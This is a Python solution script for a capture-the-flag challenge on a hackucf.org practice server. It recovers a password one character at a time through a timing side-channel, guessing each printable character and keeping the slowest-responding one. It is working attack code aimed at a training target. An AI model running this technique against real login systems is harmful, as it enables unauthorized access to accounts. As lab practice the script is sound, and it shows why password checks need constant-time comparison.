import requests
from html.parser import HTMLParser
import re
import decimal

url = 'http://ctf.hackucf.org:4000/bad_code/bad_code.php'

# parse the response
class MyHTMLParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self);
        self.result = -1;
        self.current_time = 0;

    def handle_data(self, data):
        if data.lower()[:5] == "wrong":
            self.result = 0;
        elif "flag" in data.lower():
            self.result = 1;
        elif re.match(r'[0-9]*\.[0-9]+', data):
            self.current_time = decimal.Decimal(data);

password = bytearray();
solved = False;
j = 0;
while True:
    j += 1;
    max_time = 0;
    max_time_char = 0;

    # loop through all possible typable characters/characters on US keyboard
    for i in range(32,127):
        # convert i to a byte and append it to the password
        passwd = password + bytes([i]);
        params = {'passwd': passwd.decode('utf-8')}

        # post to the passwd field in the form using the password variable
        r = requests.get(url, params=params);

        #initialize the parser
        parser = MyHTMLParser();
        # feed the parser the response
        parser.feed(r.text);
        
        if parser.result == 1:
            print(r.text);
            max_time_char = i;
            solved = True;
            break;
        elif max_time < parser.current_time:
            max_time = parser.current_time;
            max_time_char = i;
    password.append(max_time_char);
    print("current password: " + password.decode('utf-8'));
    if solved:
        break;
print("password is: " + password.decode('utf-8'));
